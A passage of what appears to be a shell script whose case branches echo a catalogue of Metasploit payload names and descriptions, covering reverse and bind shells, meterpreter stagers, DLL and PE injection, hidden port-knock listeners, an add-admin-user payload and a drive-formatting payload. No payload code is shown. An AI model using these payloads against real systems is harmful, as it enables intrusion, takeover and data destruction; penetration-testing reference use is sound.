    osx/x86/vforkshell_bind_tcp           Listen for a connection, vfork if nec
                                          essary, and spawn a command shell
    osx/x86/vforkshell_reverse_tcp        Connect back to attacker, vfork if ne
                                          cessary, and spawn a command shell
";;
	16) echo "    php/bind_perl                         Listen for a connection and spawn a c
                                          ommand shell via perl (persistent)
    php/bind_perl_ipv6                    Listen for a connection and spawn a c
                                          ommand shell via perl (persistent) ov
                                          er IPv6
    php/bind_php                          Listen for a connection and spawn a c
                                          ommand shell via php
    php/bind_php_ipv6                     Listen for a connection and spawn a c
                                          ommand shell via php (IPv6)
    php/download_exec                     Download an EXE from an HTTP URL and
                                          execute it
    php/exec                              Execute a single system command
    php/meterpreter/bind_tcp              Run a meterpreter server in PHP. List
                                          en for a connection
    php/meterpreter/bind_tcp_ipv6         Run a meterpreter server in PHP. List
                                          en for a connection over IPv6
    php/meterpreter/bind_tcp_ipv6_uuid    Run a meterpreter server in PHP. List
                                          en for a connection over IPv6 with UU
                                          ID Support
    php/meterpreter/bind_tcp_uuid         Run a meterpreter server in PHP. List
                                          en for a connection with UUID Support
    php/meterpreter/reverse_tcp           Run a meterpreter server in PHP. Reve
                                          rse PHP connect back stager with chec
                                          ks for disabled functions
    php/meterpreter/reverse_tcp_uuid      Run a meterpreter server in PHP. Reve
                                          rse PHP connect back stager with chec
                                          ks for disabled functions
    php/meterpreter_reverse_tcp           Connect back to attacker and spawn a
                                          Meterpreter server (PHP)
    php/reverse_perl                      Creates an interactive shell via perl
    php/reverse_php                       Reverse PHP connect back shell with c
                                          hecks for disabled functions
    php/shell_findsock                    Spawn a shell on the established conn
                                          ection to the webserver. Unfortunatel
                                          y, this payload can leave conspicuous
                                           evil-looking entries in the apache e
                                          rror logs, so it is probably a good i
                                          dea to use a bind or reverse shell un
                                          less firewalls prevent them from work
                                          ing. The issue this payload takes adv
                                          antage of (CLOEXEC flag not set on so
                                          ckets) appears to have been patched o
                                          n the Ubuntu version of Apache and ma
                                          y not work on other Debian-based dist
                                          ributions. Only tested on Apache but
                                          it might work on other web servers th
                                          at leak file descriptors to child pro
                                          cesses.
";;
	17) echo "    python/meterpreter/bind_tcp           Run a meterpreter server in Python (c
                                          ompatible with 2.5-2.7 & 3.1+). Liste
                                          n for a connection
    python/meterpreter/bind_tcp_uuid      Run a meterpreter server in Python (c
                                          ompatible with 2.5-2.7 & 3.1+). Liste
                                          n for a connection with UUID Support
    python/meterpreter/reverse_http       Run a meterpreter server in Python (c
                                          ompatible with 2.5-2.7 & 3.1+). Tunne
                                          l communication over HTTP
    python/meterpreter/reverse_https      Run a meterpreter server in Python (c
                                          ompatible with 2.5-2.7 & 3.1+). Tunne
                                          l communication over HTTP using SSL
    python/meterpreter/reverse_tcp        Run a meterpreter server in Python (c
                                          ompatible with 2.5-2.7 & 3.1+). Conne
                                          ct back to the attacker
    python/meterpreter/reverse_tcp_ssl    Run a meterpreter server in Python (c
                                          ompatible with 2.5-2.7 & 3.1+). Rever
                                          se Python connect back stager using S
                                          SL
    python/meterpreter/reverse_tcp_uuid   Run a meterpreter server in Python (c
                                          ompatible with 2.5-2.7 & 3.1+). Conne
                                          ct back to the attacker with UUID Sup
                                          port
    python/meterpreter_bind_tcp           Connect to the victim and spawn a Met
                                          erpreter shell
    python/meterpreter_reverse_http       Connect back to the attacker and spaw
                                          n a Meterpreter shell
    python/meterpreter_reverse_https      Connect back to the attacker and spaw
                                          n a Meterpreter shell
    python/meterpreter_reverse_tcp        Connect back to the attacker and spaw
                                          n a Meterpreter shell
    python/pingback_bind_tcp              Listens for a connection from the att
                                          acker, sends a UUID, then terminates
    python/pingback_reverse_tcp           Connects back to the attacker, sends
                                          a UUID, then terminates
    python/shell_bind_tcp                 Creates an interactive shell via Pyth
                                          on, encodes with base64 by design. Co
                                          mpatible with Python 2.4-2.7 and 3.4+
                                          .
    python/shell_reverse_tcp              Creates an interactive shell via Pyth
                                          on, encodes with base64 by design. Co
                                          mpatible with Python 2.4-2.7 and 3.4+
                                          .
    python/shell_reverse_tcp_ssl          Creates an interactive shell via Pyth
                                          on, uses SSL, encodes with base64 by
                                          design. Compatible with Python 2.6-2.
                                          7 and 3.4+.
    python/shell_reverse_udp              Creates an interactive shell via Pyth
                                          on, encodes with base64 by design. Co
                                          mpatible with Python 2.6-2.7 and 3.4+
                                          .
";;
	18) echo "    r/shell_bind_tcp                      Continually listen for a connection a
                                          nd spawn a command shell via R
    r/shell_reverse_tcp                   Connect back and create a command she
                                          ll via R
";;
	19) echo "    ruby/pingback_bind_tcp                Listens for a connection from the att
                                          acker, sends a UUID, then terminates
    ruby/pingback_reverse_tcp             Connect back to the attacker, sends a
                                           UUID, then terminates
    ruby/shell_bind_tcp                   Continually listen for a connection a
                                          nd spawn a command shell via Ruby
    ruby/shell_bind_tcp_ipv6              Continually listen for a connection a
                                          nd spawn a command shell via Ruby
    ruby/shell_reverse_tcp                Connect back and create a command she
                                          ll via Ruby
    ruby/shell_reverse_tcp_ssl            Connect back and create a command she
                                          ll via Ruby, uses SSL
";;
	20) echo "    solaris/sparc/shell_bind_tcp          Listen for a connection and spawn a c
                                          ommand shell
    solaris/sparc/shell_find_port         Spawn a shell on an established conne
                                          ction
    solaris/sparc/shell_reverse_tcp       Connect back to attacker and spawn a
                                          command shell
    solaris/x86/shell_bind_tcp            Listen for a connection and spawn a c
                                          ommand shell
    solaris/x86/shell_find_port           Spawn a shell on an established conne
                                          ction
    solaris/x86/shell_reverse_tcp         Connect back to attacker and spawn a
                                          command shell
";;
	21) echo "    tty/unix/interact                     Interacts with a TTY on an establishe
                                          d socket connection
";;
	22) echo "    windows/adduser                       Create a new user and add them to loc
                                          al administration group. Note: The sp
                                          ecified password is checked for commo
                                          n complexity requirements to prevent
                                          the target machine rejecting the user
                                           for failing to meet policy requireme
                                          nts. Complexity check: 8-14 chars (1
                                          UPPER, 1 lower, 1 digit/special)
    windows/dllinject/bind_hidden_ipknoc  Inject a DLL via a reflective loader.
    k_tcp                                  Listen for a connection. First, the
                                          port will need to be knocked from the
                                           IP defined in KHOST. This IP will wo
                                          rk as an authentication method (you c
                                          an spoof it with tools like hping). A
                                          fter that you could get your shellcod
                                          e from any IP. The socket will appear
                                           as 'closed,' thus helping to hide th
                                          e shellcode
    windows/dllinject/bind_hidden_tcp     Inject a DLL via a reflective loader.
                                           Listen for a connection from a hidde
                                          n port and spawn a command shell to t
                                          he allowed host.
    windows/dllinject/bind_ipv6_tcp       Inject a DLL via a reflective loader.
                                           Listen for an IPv6 connection (Windo
                                          ws x86)
    windows/dllinject/bind_ipv6_tcp_uuid  Inject a DLL via a reflective loader.
                                           Listen for an IPv6 connection with U
                                          UID Support (Windows x86)
    windows/dllinject/bind_named_pipe     Inject a DLL via a reflective loader.
                                           Listen for a pipe connection (Window
                                          s x86)
    windows/dllinject/bind_nonx_tcp       Inject a DLL via a reflective loader.
                                           Listen for a connection (No NX)
    windows/dllinject/bind_tcp            Inject a DLL via a reflective loader.
                                           Listen for a connection (Windows x86
                                          )
    windows/dllinject/bind_tcp_rc4        Inject a DLL via a reflective loader.
                                           Listen for a connection
    windows/dllinject/bind_tcp_uuid       Inject a DLL via a reflective loader.
                                           Listen for a connection with UUID Su
                                          pport (Windows x86)
    windows/dllinject/find_tag            Inject a DLL via a reflective loader.
                                           Use an established connection
    windows/dllinject/reverse_hop_http    Inject a DLL via a reflective loader.
                                           Tunnel communication over an HTTP or
                                           HTTPS hop point. Note that you must
                                          first upload data/hop/hop.php to the
                                          PHP server you wish to use as a hop.
    windows/dllinject/reverse_http        Inject a DLL via a reflective loader.
                                           Tunnel communication over HTTP (Wind
                                          ows wininet)
    windows/dllinject/reverse_http_proxy  Inject a DLL via a reflective loader.
    _pstore                                Tunnel communication over HTTP
    windows/dllinject/reverse_ipv6_tcp    Inject a DLL via a reflective loader.
                                           Connect back to the attacker over IP
                                          v6
    windows/dllinject/reverse_nonx_tcp    Inject a DLL via a reflective loader.
                                           Connect back to the attacker (No NX)
    windows/dllinject/reverse_ord_tcp     Inject a DLL via a reflective loader.
                                           Connect back to the attacker
    windows/dllinject/reverse_tcp         Inject a DLL via a reflective loader.
                                           Connect back to the attacker
    windows/dllinject/reverse_tcp_allpor  Inject a DLL via a reflective loader.
    ts                                     Try to connect back to the attacker,
                                           on all possible ports (1-65535, slow
                                          ly)
    windows/dllinject/reverse_tcp_dns     Inject a DLL via a reflective loader.
                                           Connect back to the attacker
    windows/dllinject/reverse_tcp_rc4     Inject a DLL via a reflective loader.
                                           Connect back to the attacker
    windows/dllinject/reverse_tcp_rc4_dn  Inject a DLL via a reflective loader.
    s                                      Connect back to the attacker
    windows/dllinject/reverse_tcp_uuid    Inject a DLL via a reflective loader.
                                           Connect back to the attacker with UU
                                          ID Support
    windows/dllinject/reverse_winhttp     Inject a DLL via a reflective loader.
                                           Tunnel communication over HTTP (Wind
                                          ows winhttp)
    windows/dns_txt_query_exec            Performs a TXT query against a series
                                           of DNS record(s) and executes the re
                                          turned payload
    windows/download_exec                 Download an EXE from an HTTP(S)/FTP U
                                          RL and execute it
    windows/exec                          Execute an arbitrary command
    windows/format_all_drives             This payload formats all mounted disk
                                          s in Windows (aka ShellcodeOfDeath).
                                          After formatting, this payload sets t
                                          he volume label to the string specifi
                                          ed in the VOLUMELABEL option. If the
                                          code is unable to access a drive for
                                          any reason, it skips the drive and pr
                                          oceeds to the next volume.
    windows/loadlibrary                   Load an arbitrary library path
    windows/messagebox                    Spawns a dialog via MessageBox using
                                          a customizable title, text & icon
    windows/meterpreter/bind_hidden_ipkn  Inject the Meterpreter server DLL via
    ock_tcp                                the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Listen for a connection. Firs
                                          t, the port will need to be knocked f
                                          rom the IP defined in KHOST. This IP
                                          will work as an authentication method
                                           (you can spoof it with tools like hp
                                          ing). After that you could get your s
                                          hellcode from any IP. The socket will
                                           appear as 'closed,' thus helping to
                                          hide the shellcode
    windows/meterpreter/bind_hidden_tcp   Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Listen for a connection from
                                          a hidden port and spawn a command she
                                          ll to the allowed host.
    windows/meterpreter/bind_ipv6_tcp     Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Listen for an IPv6 connection
                                           (Windows x86)
    windows/meterpreter/bind_ipv6_tcp_uu  Inject the Meterpreter server DLL via
    id                                     the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Listen for an IPv6 connection
                                           with UUID Support (Windows x86)
    windows/meterpreter/bind_named_pipe   Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Listen for a pipe connection
                                          (Windows x86)
    windows/meterpreter/bind_nonx_tcp     Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Listen for a connection (No N
                                          X)
    windows/meterpreter/bind_tcp          Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Listen for a connection (Wind
                                          ows x86)
    windows/meterpreter/bind_tcp_rc4      Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Listen for a connection
    windows/meterpreter/bind_tcp_uuid     Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Listen for a connection with
                                          UUID Support (Windows x86)
    windows/meterpreter/find_tag          Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Use an established connection
    windows/meterpreter/reverse_hop_http  Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Tunnel communication over an
                                          HTTP or HTTPS hop point. Note that yo
                                          u must first upload data/hop/hop.php
                                          to the PHP server you wish to use as
                                          a hop.
    windows/meterpreter/reverse_http      Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Tunnel communication over HTT
                                          P (Windows wininet)
    windows/meterpreter/reverse_http_pro  Inject the Meterpreter server DLL via
    xy_pstore                              the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Tunnel communication over HTT
                                          P
    windows/meterpreter/reverse_https     Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Tunnel communication over HTT
                                          PS (Windows wininet)
    windows/meterpreter/reverse_https_pr  Inject the Meterpreter server DLL via
    oxy                                    the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Tunnel communication over HTT
                                          P using SSL with custom proxy support
    windows/meterpreter/reverse_ipv6_tcp  Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Connect back to the attacker
                                          over IPv6
    windows/meterpreter/reverse_named_pi  Inject the Meterpreter server DLL via
    pe                                     the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Connect back to the attacker
                                          via a named pipe pivot
    windows/meterpreter/reverse_nonx_tcp  Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Connect back to the attacker
                                          (No NX)
    windows/meterpreter/reverse_ord_tcp   Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Connect back to the attacker
    windows/meterpreter/reverse_tcp       Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Connect back to the attacker
    windows/meterpreter/reverse_tcp_allp  Inject the Meterpreter server DLL via
    orts                                   the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Try to connect back to the at
                                          tacker, on all possible ports (1-6553
                                          5, slowly)
    windows/meterpreter/reverse_tcp_dns   Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Connect back to the attacker
    windows/meterpreter/reverse_tcp_rc4   Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Connect back to the attacker
    windows/meterpreter/reverse_tcp_rc4_  Inject the Meterpreter server DLL via
    dns                                    the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Connect back to the attacker
    windows/meterpreter/reverse_tcp_uuid  Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Connect back to the attacker
                                          with UUID Support
    windows/meterpreter/reverse_winhttp   Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Tunnel communication over HTT
                                          P (Windows winhttp)
    windows/meterpreter/reverse_winhttps  Inject the Meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Tunnel communication over HTT
                                          PS (Windows winhttp)
    windows/meterpreter_bind_named_pipe   Connect to victim and spawn a Meterpr
                                          eter shell. Requires Windows XP SP2 o
                                          r newer.
    windows/meterpreter_bind_tcp          Connect to victim and spawn a Meterpr
                                          eter shell. Requires Windows XP SP2 o
                                          r newer.
    windows/meterpreter_reverse_http      Connect back to attacker and spawn a
                                          Meterpreter shell. Requires Windows X
                                          P SP2 or newer.
    windows/meterpreter_reverse_https     Connect back to attacker and spawn a
                                          Meterpreter shell. Requires Windows X
                                          P SP2 or newer.
    windows/meterpreter_reverse_ipv6_tcp  Connect back to attacker and spawn a
                                          Meterpreter shell. Requires Windows X
                                          P SP2 or newer.
    windows/meterpreter_reverse_tcp       Connect back to attacker and spawn a
                                          Meterpreter shell. Requires Windows X
                                          P SP2 or newer.
    windows/metsvc_bind_tcp               Stub payload for interacting with a M
                                          eterpreter Service
    windows/metsvc_reverse_tcp            Stub payload for interacting with a M
                                          eterpreter Service
    windows/patchupdllinject/bind_hidden  Inject a custom DLL into the exploite
    _ipknock_tcp                          d process. Listen for a connection. F
                                          irst, the port will need to be knocke
                                          d from the IP defined in KHOST. This
                                          IP will work as an authentication met
                                          hod (you can spoof it with tools like
                                           hping). After that you could get you
                                          r shellcode from any IP. The socket w
                                          ill appear as 'closed,' thus helping
                                          to hide the shellcode
    windows/patchupdllinject/bind_hidden  Inject a custom DLL into the exploite
    _tcp                                  d process. Listen for a connection fr
                                          om a hidden port and spawn a command
                                          shell to the allowed host.
    windows/patchupdllinject/bind_ipv6_t  Inject a custom DLL into the exploite
    cp                                    d process. Listen for an IPv6 connect
                                          ion (Windows x86)
    windows/patchupdllinject/bind_ipv6_t  Inject a custom DLL into the exploite
    cp_uuid                               d process. Listen for an IPv6 connect
                                          ion with UUID Support (Windows x86)
    windows/patchupdllinject/bind_named_  Inject a custom DLL into the exploite
    pipe                                  d process. Listen for a pipe connecti
                                          on (Windows x86)
    windows/patchupdllinject/bind_nonx_t  Inject a custom DLL into the exploite
    cp                                    d process. Listen for a connection (N
                                          o NX)
    windows/patchupdllinject/bind_tcp     Inject a custom DLL into the exploite
                                          d process. Listen for a connection (W
                                          indows x86)
    windows/patchupdllinject/bind_tcp_rc  Inject a custom DLL into the exploite
    4                                     d process. Listen for a connection
    windows/patchupdllinject/bind_tcp_uu  Inject a custom DLL into the exploite
    id                                    d process. Listen for a connection wi
                                          th UUID Support (Windows x86)
    windows/patchupdllinject/find_tag     Inject a custom DLL into the exploite
                                          d process. Use an established connect
                                          ion
    windows/patchupdllinject/reverse_ipv  Inject a custom DLL into the exploite
    6_tcp                                 d process. Connect back to the attack
                                          er over IPv6
    windows/patchupdllinject/reverse_non  Inject a custom DLL into the exploite
    x_tcp                                 d process. Connect back to the attack
                                          er (No NX)
    windows/patchupdllinject/reverse_ord  Inject a custom DLL into the exploite
    _tcp                                  d process. Connect back to the attack
                                          er
    windows/patchupdllinject/reverse_tcp  Inject a custom DLL into the exploite
                                          d process. Connect back to the attack
                                          er
    windows/patchupdllinject/reverse_tcp  Inject a custom DLL into the exploite
    _allports                             d process. Try to connect back to the
                                           attacker, on all possible ports (1-6
                                          5535, slowly)
    windows/patchupdllinject/reverse_tcp  Inject a custom DLL into the exploite
    _dns                                  d process. Connect back to the attack
                                          er
    windows/patchupdllinject/reverse_tcp  Inject a custom DLL into the exploite
    _rc4                                  d process. Connect back to the attack
                                          er
    windows/patchupdllinject/reverse_tcp  Inject a custom DLL into the exploite
    _rc4_dns                              d process. Connect back to the attack
                                          er
    windows/patchupdllinject/reverse_tcp  Inject a custom DLL into the exploite
    _uuid                                 d process. Connect back to the attack
                                          er with UUID Support
    windows/patchupmeterpreter/bind_hidd  Inject the meterpreter server DLL (st
    en_ipknock_tcp                        aged). Listen for a connection. First
                                          , the port will need to be knocked fr
                                          om the IP defined in KHOST. This IP w
                                          ill work as an authentication method
                                          (you can spoof it with tools like hpi
                                          ng). After that you could get your sh
                                          ellcode from any IP. The socket will
                                          appear as 'closed,' thus helping to h
                                          ide the shellcode
    windows/patchupmeterpreter/bind_hidd  Inject the meterpreter server DLL (st
    en_tcp                                aged). Listen for a connection from a
                                           hidden port and spawn a command shel
                                          l to the allowed host.
    windows/patchupmeterpreter/bind_ipv6  Inject the meterpreter server DLL (st
    _tcp                                  aged). Listen for an IPv6 connection
                                          (Windows x86)
    windows/patchupmeterpreter/bind_ipv6  Inject the meterpreter server DLL (st
    _tcp_uuid                             aged). Listen for an IPv6 connection
                                          with UUID Support (Windows x86)
    windows/patchupmeterpreter/bind_name  Inject the meterpreter server DLL (st
    d_pipe                                aged). Listen for a pipe connection (
                                          Windows x86)
    windows/patchupmeterpreter/bind_nonx  Inject the meterpreter server DLL (st
    _tcp                                  aged). Listen for a connection (No NX
                                          )
    windows/patchupmeterpreter/bind_tcp   Inject the meterpreter server DLL (st
                                          aged). Listen for a connection (Windo
                                          ws x86)
    windows/patchupmeterpreter/bind_tcp_  Inject the meterpreter server DLL (st
    rc4                                   aged). Listen for a connection
    windows/patchupmeterpreter/bind_tcp_  Inject the meterpreter server DLL (st
    uuid                                  aged). Listen for a connection with U
                                          UID Support (Windows x86)
    windows/patchupmeterpreter/find_tag   Inject the meterpreter server DLL (st
                                          aged). Use an established connection
    windows/patchupmeterpreter/reverse_i  Inject the meterpreter server DLL (st
    pv6_tcp                               aged). Connect back to the attacker o
                                          ver IPv6
    windows/patchupmeterpreter/reverse_n  Inject the meterpreter server DLL (st
    onx_tcp                               aged). Connect back to the attacker (
                                          No NX)
    windows/patchupmeterpreter/reverse_o  Inject the meterpreter server DLL (st
    rd_tcp                                aged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_t  Inject the meterpreter server DLL (st
    cp                                    aged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_t  Inject the meterpreter server DLL (st
    cp_allports                           aged). Try to connect back to the att
                                          acker, on all possible ports (1-65535
                                          , slowly)
    windows/patchupmeterpreter/reverse_t  Inject the meterpreter server DLL (st
    cp_dns                                aged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_t  Inject the meterpreter server DLL (st
    cp_rc4                                aged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_t  Inject the meterpreter server DLL (st
    cp_rc4_dns                            aged). Connect back to the attacker
    windows/patchupmeterpreter/reverse_t  Inject the meterpreter server DLL (st
    cp_uuid                               aged). Connect back to the attacker w
                                          ith UUID Support
    windows/peinject/bind_hidden_ipknock  Inject a custom native PE file into t
    _tcp                                  he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Liste
                                          n for a connection. First, the port w
                                          ill need to be knocked from the IP de
                                          fined in KHOST. This IP will work as
                                          an authentication method (you can spo
                                          of it with tools like hping). After t
                                          hat you could get your shellcode from
                                           any IP. The socket will appear as 'c
                                          losed,' thus helping to hide the shel
                                          lcode
    windows/peinject/bind_hidden_tcp      Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Liste
                                          n for a connection from a hidden port
                                           and spawn a command shell to the all
                                          owed host.
    windows/peinject/bind_ipv6_tcp        Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Liste
                                          n for an IPv6 connection (Windows x86
                                          )
    windows/peinject/bind_ipv6_tcp_uuid   Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Liste
                                          n for an IPv6 connection with UUID Su
                                          pport (Windows x86)
    windows/peinject/bind_named_pipe      Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Liste
                                          n for a pipe connection (Windows x86)
    windows/peinject/bind_nonx_tcp        Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Liste
                                          n for a connection (No NX)
    windows/peinject/bind_tcp             Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Liste
                                          n for a connection (Windows x86)
    windows/peinject/bind_tcp_rc4         Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Liste
                                          n for a connection
    windows/peinject/bind_tcp_uuid        Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Liste
                                          n for a connection with UUID Support
                                          (Windows x86)
    windows/peinject/find_tag             Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Use a
                                          n established connection
    windows/peinject/reverse_ipv6_tcp     Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Conne
                                          ct back to the attacker over IPv6
    windows/peinject/reverse_named_pipe   Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Conne
                                          ct back to the attacker via a named p
                                          ipe pivot
    windows/peinject/reverse_nonx_tcp     Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Conne
                                          ct back to the attacker (No NX)
    windows/peinject/reverse_ord_tcp      Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Conne
                                          ct back to the attacker
    windows/peinject/reverse_tcp          Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Conne
                                          ct back to the attacker
